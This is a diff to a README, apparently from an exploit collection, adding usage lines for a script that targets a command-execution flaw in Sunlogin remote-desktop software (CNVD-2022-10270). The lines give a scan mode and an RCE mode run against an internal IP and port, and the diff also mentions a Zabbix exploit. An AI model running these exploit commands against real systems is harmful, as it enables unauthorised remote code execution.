@@ -16,12 +16,18 @@ python3 CVE-2022-23131.py -u http://127.0.0.1 -a Admin
 
 ## 向日葵存在命令执行漏洞(CNVD-2022-10270)     sunlogin_rce.py
 
-## 验证
+## poc
 ```
-python3 sunlogin_rce.py
+python3 sunlogin_rce.py --scan -u 10.108.3.74
 ```
-![image](https://user-images.githubusercontent.com/33044636/156746675-ae44db14-24f6-4bde-a400-07b970cf1fb5.png)
+![image](https://user-images.githubusercontent.com/33044636/162583279-56122224-ba29-4264-9acc-470be16c615a.png)
 
+## rce
+```
+python3 sunlogin_rce.py --rce -u 10.108.3.74 -p 21021
+```
+
+![image](https://user-images.githubusercontent.com/33044636/162583376-53735402-e789-4822-a78a-c467013a63b3.png)
 
 
 
